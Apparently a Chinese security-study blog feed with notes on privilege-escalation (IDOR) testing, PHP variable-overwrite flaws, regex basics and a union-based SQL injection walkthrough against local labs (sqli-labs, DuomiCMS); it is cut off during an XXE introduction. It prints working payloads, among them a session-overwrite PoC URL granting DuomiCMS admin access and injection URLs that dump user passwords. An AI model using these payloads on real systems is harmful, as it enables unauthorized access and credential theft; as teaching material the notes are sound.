title="越权漏洞描述"></a>越权漏洞描述</h2><p>越权访问，这类漏洞是指应用在检查授权(Authorization)时存在纰漏，使得攻击者在获得低权限用户帐后后，可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在着两种越权操作类型：横向越权操作(平行越权)和纵向越权操作(垂直越权)。</p><ul><li><strong>水平越权漏洞</strong>，是一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人而导致的越权数据访问漏洞。如服务器端从客户端提交的request参数(用户能够控制的数据)中获取用户id，恶意攻击者通过变换请求ID的值，查看或修改不属于本人的数据。</li><li><strong>垂直越权漏洞</strong>，也称为权限提升，是一种“基于URL的访问控制”设计缺陷引起的漏洞。由于Web应用程序没有做权限控制或者仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn5h46bnj30ty0fggno.jpg" alt></li></ul><p>我们可以这么说<strong>把握住传参就能把握住逻辑漏洞的命脉</strong>，其实渗透测试也是同一道理，漏洞是不会无缘无故产生。</p><h3 id="越权思路"><a href="#越权思路" class="headerlink" title="越权思路"></a>越权思路</h3><p>登入用户A，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试(当然如果可以影响到更高权限的用户就是垂直越权漏洞)</p><p>传参ID参数需要自己检测(常见：uid= id= user= 等)通常使用brup进行爆破传参(传参可能在GET POST COOKIE中)</p><p>常见的平行越权(不需要输入原密码的修改密码，抓包该改用户或者用户ID修改他人密码)进行查看订单信息，遍历订单id等。</p><h3 id="越权漏洞实例与类型"><a href="#越权漏洞实例与类型" class="headerlink" title="越权漏洞实例与类型"></a>越权漏洞实例与类型</h3><ol><li>通过修改GET传参来越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0205340.html" target="_blank" rel="noopener">GET越权实例</a></li><li>修改POST传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0207583.html" target="_blank" rel="noopener">POST越权实例</a></li><li>修改cookie传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0184633.html" target="_blank" rel="noopener">COOKIE越权实例</a></li></ol><p>还有一类叫做<strong>未授权访问</strong>，严格意义上而言这个不属于越权漏洞，但是在日常的测试中常常会遇见</p><p>(只要<strong>输入正确对应身份的网址就可以直接访问</strong>，例如/admin默认是登录，登陆后跳转到user.php然后直接访问user.php，发现你直接有后台权限)</p><h2 id="靶场实际"><a href="#靶场实际" class="headerlink" title="靶场实际"></a>靶场实际</h2><p>靶场是一个很老的保修系统，虽然很老，但是还是有些网站还在使用(BWSsoft维修系统)<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn66xuz7j31h80pydo1.jpg" alt="2"><br>我们想要去做一个越权，那我们需要先有一个普通用户的使用权限，我们看到了注册按钮，于是我们进行了注册，获得了一个普通用户身份。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn6kpdp3j31hc0p2dnr.jpg" alt="3"><br>我们点击物品保修，并抓个包看看。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3snle4qokj30z40rkabo.jpg" alt="4"><br>我们发现cookie中存在登陆用户的信息传参，那我们是否能对其数据更改进行越权<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7bm6blj31a00mt0vp.jpg" alt="5"><br>我们看到admin=0，那管理员的admin传参是不是要等于1呢，我改了一下，但是没用，后面我看到了一个shenfen的传参，两个一起修改才有效呢，管理员的参数值一般为1(true)，那我们试一下。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7p34boj30v80oswhs.jpg" alt="6"><br>发现改完以后出现了后台管理的按钮<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn84pl6pj31hc0q2wmh.jpg" alt="7"><br>我们点击进去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn8f7fi1j31hc0hltak.jpg" alt="8"><br>发现成功进去后台。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="变量覆盖介绍"><a href="#变量覆盖介绍" class="headerlink" title="变量覆盖介绍"></a>变量覆盖介绍</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击；变量覆盖漏洞有时候可以直接让我们获取Webshell，拿到服务器权限； </p><p>经常导致变量覆盖漏洞场景有：<strong>$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。</strong></p><h2 id="变量覆盖函数解析"><a href="#变量覆盖函数解析" class="headerlink" title="变量覆盖函数解析"></a>变量覆盖函数解析</h2><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p>extract() 函数从数组中将变量导入到当前的符号表。<strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。具体函数介绍：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" title="具体函数介绍" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><p><strong>示例一：</strong></p><p>将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：$a = Cat; $b = Dog; $c = Horse</span><br></pre></td></tr></table></figure></p><p>成功将变量a覆盖</p><p><strong>示例二：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=1;  </span><br><span class="line">extract($_GET);</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br><span class="line">//提交：?id=123</span><br><span class="line">//结果： 123</span><br></pre></td></tr></table></figure><p>成功将变量id覆盖:</p><p><strong>extract()函数防御:</strong></p><p><strong>在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖  extract($_GET,EXTR_SKIP);</strong></p><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。用法参考：<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name=allblue&amp;age=18&quot;);</span><br><span class="line">echo $name  //输出allblue</span><br><span class="line">echo $age   //输出18</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>parse_str()函数防御:</strong><br>只能在传参前添加判断语句，判断变量是否存在；</p><p>tips：parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p><h3 id="导致变量覆盖问题"><a href="#导致变量覆盖问题" class="headerlink" title="$$导致变量覆盖问题"></a>$$导致变量覆盖问题</h3><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?id=2 会将$id的值覆盖，$id=2。</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=1;</span><br><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $request)&#123;</span><br><span class="line">foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line">echo $a;     //通过传入参数实现变量覆盖</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h3><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p><p>import_request_variables ( string $types , string $prefix )</p><p>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE.</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    </span><br><span class="line">import_request_variables(&apos;GP&apos;);   </span><br><span class="line">print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此页面当使用GET或POST传递$a变量时，会将原变量的值覆盖。</p><p>值得注意的是：此函数只能用在 PHP4.1 ~ PHP5.4之间。<br>此函数是非常危险的函数，在PHP5.5之后已被官方删除，假如你任然在使用低版本的PHP环境，也建议你避免使用此函数。</p><p>###全局变量覆盖<br>register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//?id=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;$id :&apos;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p><p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p><p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">if (ini_get(&apos;register_globals&apos;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);  </span><br><span class="line">print $a.&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">print $_GET[b];  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在register_globals=ON时,</p><p>提交/test.php?a=1&amp;b=2 , 变量$a未初始化,$_GET[b]=2</p><p>提交/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p><p>tips:　从 PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>靶场环境：Duomicmsx2.0；<br>审计工具：seay源码审计系统；<br>因为我们做的是变量覆盖的题目，所有我们先在seay源码审计系统加上一条匹配$$的正则匹配规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([^\$&quot;]|$)\$\&#123;?\$</span><br></pre></td></tr></table></figure></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd18kavzj31970nqwja.jpg" alt></p><p>通过审计工具的自动审计功能来审计可能存在的漏洞：</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1kgorfj31hc0smtlz.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1y1tssj31az0myajn.jpg" alt><br>最后寻找，发现了foreach和$$结合的变量覆盖漏洞</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd29fa65j319j0pyaga.jpg" alt></p><p>找到了文件覆盖，但是我们需要找到可以调用覆盖的地方，我们先搜索包含commond.php的文件，看看能不能在其关联的文件中找到可利用代码</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2k0sthj31ap0qwwl5.jpg" alt><br>最后我们找到一个包含了common.php和check.admin.php的文件login.php</p><p>我们发现check.admin.php是通过获取用户登录时的id来判断用户的权限，是不是管理员<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2vgj7aj31gw0sewo8.jpg" alt></p><p>而在admin.manager.php有一个判断，直接根据判断传进来的$groupid来进行身份验证。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd34m68bj31hc0smqb6.jpg" alt></p><p>如果传进来的session值为1，那么就是管理员的权限</p><p>通过构造POC使得duomi_group_id=1,就可以登录系统管理员，POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p>我们进去后台登录界面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3da67rj31hc0pv40b.jpg" alt><br>后台没有管路员密码登录不上<br>插入我们构造的POC：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3nw2muj31hb0r80u8.jpg" alt><br>插入成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3vn3gej31hc0pm76u.jpg" alt><br>进入后台页面，发现没密码，自动成功登录。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/12/07/zhengzebiaodashi/"/>
      <url>/2019/12/07/zhengzebiaodashi/</url>
      
        <content type="html"><![CDATA[<p>正则表达式（类似查找文件）(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）<br>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以<code>用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等</code>。</p><h2 id="正则函数"><a href="#正则函数" class="headerlink" title="正则函数"></a>正则函数</h2><ul><li><strong>preg_match ( string $pattern , string $subject ,  [array &amp;$matches] )</strong></li></ul><p>pattern：要搜索的模式，字符串类型，正则表达式 。</p><p>subject：输入字符串。 </p><p>matches：可选，存储匹配结果的数组。</p><p>作用是：执行一个正则表达式匹配，成功返回 1 ，否则返回 0</p><ul><li><p><strong>preg_replace<br>(正则，替换的字符串，匹配的字符串）</strong><br>将所有的匹配正则的字符串进行替换；</p><p><code>通常可以用来过滤敏感字符</code></p><ul><li><strong>preg_match_grep()</strong><br>匹配一个匹配正则的子字符数组，包含匹配的字符串</li></ul></li></ul><ul><li><strong>preg_match_all(正则，匹配的字符串，输出的二维数组</strong><h1 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h1></li></ul><hr><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。<br>正则表达式的限定符有：</p><p>正则表达式的限定符有：</p><h3 id="字符描述"><a href="#字符描述" class="headerlink" title="字符描述:"></a>字符描述:</h3><p> *匹配前面的子表达式零次或多次。例如，zo<em> 能匹配 “z” 以及 “zoo”。</em> 等价于{0,}。</p><p> + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</p><p>?    匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</p><p>{n}    n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}    n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}    m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><h1 id="总结元字符："><a href="#总结元字符：" class="headerlink" title="总结元字符："></a>总结元字符：</h1><hr><p>\<br>将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。</p><p>^<br>匹配输入字符串的开始位置。</p><p>$<br>匹配输入字符串的结束位置。</p><p>*<br>匹配前面的子表达式零次或多次。</p><p>+<br>匹配前面的子表达式一次或多次。<br>?<br>匹配前面的子表达式零次或一次。</p><p>{n}<br>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}<br>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}<br>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\d<br>匹配一个数字字符。</p><p>\D<br>匹配一个非数字字符。</p><p>\f<br>匹配一个换页符。</p><p>\n<br>匹配一个换行符。</p><p>\r<br>匹配一个回车符。</p><p>\s<br>匹配任何空白字符，包括空格、制表符、换页符等等。</p><p>\S<br>匹配任何非空白字符。</p><p>\w<br>匹配字母、数字、下划线。</p><p>\W<br>匹配非字母、数字、下划线。</p><hr><h3 id="记得在php中使用正则表达式用-分界！"><a href="#记得在php中使用正则表达式用-分界！" class="headerlink" title="记得在php中使用正则表达式用/分界！"></a>记得在php中使用正则表达式用/分界！</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入：显错注入</title>
      <link href="/2019/12/07/zhengze/"/>
      <url>/2019/12/07/zhengze/</url>
      
        <content type="html"><![CDATA[<p><br>(在这里我们用sqli-lab为例)<br><br><strong>我们首先要检查是否会有注入漏洞，and 1=1法显示不出错误信息，我们尝试用’测试，发现出现错误信息，也证明有注入漏洞。<br></strong><br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/sxw6wE4Na9CwDf2J95VFD5xdrWGvCDy8zYhOwrWEgRY!/b/dFIBAAAAAAAA&amp;bo=gQb5AIEG.QADCSw!&amp;rf=viewer_4" alt><br><strong><br>我们根据错误信息知道多出一个多余的’ 那我们应该怎么样才能使多余的’ 语法让sql语句正确回显呢?<br></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure></p><p><strong>我们通过注释后面的语句注释掉，使得引号闭合；</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos;--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/4tl2YYuvPIdxpHq7.lhk5zQhLLEB8fqesx4UuLyV.PU!/b/dFMBAAAAAAAA&amp;bo=IgVTASIFUwEDGTw!&amp;rf=viewer_4" alt><br><strong>测试字段数,发现order by 4出错，3则正常显示，说明字段为3<br>（order by 是mysql用来排序的，我们可以通过他来测试字段数）：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=1&apos; order by 3--+</span><br></pre></td></tr></table></figure><p><strong>测试回显点，发现回显位是2，3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/u7xpdeuVSeeKngk.j13h3LAfU1eMVgdCH9T.CWlDrHo!/b/dL8AAAAAAAAA&amp;bo=qwShAAAAAAADByw!&amp;rf=viewer_4" alt></p><p><strong>查询版本号，如果是5.0以上,则可以用系统库查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,version()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.kj.wKY22UkPB5mLbk*udHdjiJAigOznbz0cagNMwHY!/b/dLgAAAAAAAAA&amp;bo=EAXjAAAAAAADB9Q!&amp;rf=viewer_4" alt></p><p><strong>查询数据库名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/.5pOBR2yPrgiR7sZUOs61G1LI6Xy58TDwHEpGb6Lb2g!/b/dFQBAAAAAAAA&amp;bo=NgbXAAAAAAADF9U!&amp;rf=viewer_4" alt><br><strong>通过数据库 系统库information的tables表查询表名(查询下个表，可以通过移动偏移量limit来查询其他表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/F5g.75Q1PLQjwcFR2.hGo5O2VJ1mX0GKK4WHq7Pf9D8!/b/dL8AAAAAAAAA&amp;bo=5wTDAAAAAAADFxI!&amp;rf=viewer_4" alt></p><p><strong>再通过数据库 系统库的columns表查询列名，通过偏移limit来查询其他字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,2,column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1 --+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/fogWx.4zppoo.XE51.8tPeW1tXIixEwyu.UH0prXdoA!/b/dLYAAAAAAAAA&amp;bo=zAStAAAAAAADF1c!&amp;rf=viewer_4" alt></p><p><strong>再来爆出字段里的内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-1/?id=888&apos; union select 1,username,password from users limit 0,1--+</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8LCHPGYOTX9e53SycijT5Py2a73o5bRbPKRZ3eFnNtQ!/b/dL8AAAAAAAAA&amp;bo=pAXIAAAAAAADB0s!&amp;rf=viewer_4" alt></p><h1 id="group-concat函数："><a href="#group-concat函数：" class="headerlink" title="group_concat函数："></a>group_concat函数：</h1><p>group_concat函数的作用将同一个分组中的值连接起来，返回一个字符串结果，这样我们就不用麻烦的去移动偏移量了。<br><a href="http://www.cnblogs.com/lcamry/p/5715634.html" target="_blank" rel="noopener">函数具体介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE-实体注入</title>
      <link href="/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p><strong>XXE即外部实体，从安全角度理解为XML外部实体注入攻击</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="内部DTD声明"><a href="#内部DTD声明" class="headerlink" title="内部DTD声明:"></a>内部DTD声明:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h4 id="引用外部DTD声明"><a href="#引用外部DTD声明" class="headerlink" title="引用外部DTD声明:"></a>引用外部DTD声明:</h4><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>或者</p><p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;s</code></p><p><strong>实例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span 